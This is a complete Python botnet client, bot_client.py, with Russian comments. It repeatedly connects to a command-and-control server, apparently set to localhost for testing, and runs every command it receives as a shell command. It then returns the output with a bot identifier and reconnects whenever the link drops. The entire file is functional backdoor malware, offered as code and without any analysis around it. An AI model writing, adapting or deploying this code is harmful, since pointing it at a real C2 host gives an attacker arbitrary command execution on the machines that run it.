# bot_client.py
import socket
import subprocess
import json
import time
import os

C2_HOST = '127.0.0.1'
C2_PORT = 8888

def connect_to_c2():
    while True:
        try:
            with socket.socket() as s:
                s.connect((C2_HOST, C2_PORT))
                print("[+] Подключено к C2")
                while True:
                    command = s.recv(4096).decode()
                    if not command:
                        break

                    # Выполняем команду
                    try:
                        result = subprocess.check_output(
                            command,
                            shell=True,
                            stderr=subprocess.STDOUT,
                            timeout=10
                        ).decode()
                    except Exception as e:
                        result = str(e)

                    # Отправляем результат
                    response = json.dumps({
                        "bot_id": os.getpid(),
                        "command": command,
                        "result": result[:2000]  # Ограничение длины
                    })
                    try:
                        s.send(response.encode())
                    except:
                        break
        except:
            time.sleep(5)  # Повторное подключение

if __name__ == "__main__":
    connect_to_c2()